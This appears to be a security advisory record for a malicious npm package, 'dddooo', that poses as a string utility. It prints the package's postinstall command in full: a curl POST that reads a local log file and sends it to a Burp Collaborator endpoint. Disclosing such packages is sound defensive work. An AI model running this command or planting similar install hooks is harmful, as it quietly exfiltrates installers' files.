summary: dddooo postinstall exfiltrates local file contents to attacker-controlled Burp Collaborator endpoint
details: package.json declares a postinstall lifecycle hook that runs `curl -X POST -d "$(cat /data/logs/monitor-2026-06-25.log)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data` on every `npm install`. The script reads an installer-side file and POSTs its contents over plaintext HTTP to a Burp Collaborator subdomain — out-of-band exfiltration infrastructure controlled by whoever generated the subdomain. The package presents itself as a generic string utility but ships no functional code matching that purpose; author, repository, homepage, and bugs URL metadata fields are all empty, consistent with a throwaway exfiltration package. Installer harm fires automatically at install time with no user opt-in.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
